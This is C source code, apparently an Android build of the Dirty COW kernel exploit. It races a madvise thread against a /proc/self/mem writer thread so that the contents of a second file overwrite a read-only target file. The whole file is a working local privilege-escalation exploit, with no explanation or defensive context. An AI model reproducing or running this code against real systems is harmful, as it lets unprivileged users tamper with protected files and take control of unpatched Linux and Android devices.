#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout)
#else
#define LOGV(...) 
#endif

#define ITERATIONS 10000000

void *map;
int f;
struct stat st;
char* newfilebuf;
int size;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<ITERATIONS;i++) {
        c+=madvise(map,size,MADV_DONTNEED);
    }
    LOGV("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<ITERATIONS;i++) {
        lseek(f,(off_t)map,SEEK_SET);
        c+=write(f,str,size);
    }
    LOGV("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
    if (argc<3)return 1;

    /*int pid = fork();*/
    /*if (pid != 0) {*/
        /*return 0;*/
    /*}*/

    pthread_t pth1,pth2;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);

    int f2=open(argv[2],O_RDONLY);
    struct stat st2;
    fstat(f2,&st2);

    if (st2.st_size != st.st_size) {
        LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st2.st_size, st.st_size);
    }
    size = st2.st_size;
    LOGV("size %d\n\n",size);

    newfilebuf = malloc(size);
    read(f2, newfilebuf, size);

    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    LOGV("mmap %p\n\n",map);
    pthread_create(&pth1,NULL,madviseThread,newfilebuf);
    pthread_create(&pth2,NULL,procselfmemThread,newfilebuf);
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);

    return 0;
}
